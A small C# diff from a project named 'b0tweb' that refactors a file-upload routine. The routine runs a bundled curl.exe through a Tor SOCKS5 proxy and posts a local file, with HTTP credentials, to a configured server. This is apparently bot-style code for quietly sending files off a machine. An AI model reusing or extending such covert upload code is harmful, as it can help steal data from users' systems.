@@ -17,7 +17,6 @@ namespace b0tweb
         /// <returns>Empty string if something went wrong, else an URL pointing to a file.</returns>
         public static string Upload(string filePath)
         {
-            string basePath = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
             string argument = String.Format(
                  "--socks5-hostname {0}:{1}  -F \"files[]=@{2}\" {3}  --user {4}:{5}",
                 TorProxy.Host,
@@ -28,7 +27,7 @@ namespace b0tweb
                 Configuration.HTTPPassword
             );
 
-            ProcessStartInfo info = new ProcessStartInfo(basePath + @"\Curl\curl.exe", argument)
+            ProcessStartInfo info = new ProcessStartInfo(FileHelper.GetBasePath() + @"\Curl\curl.exe", argument)
             {
                 RedirectStandardOutput = true,
                 UseShellExecute = false,
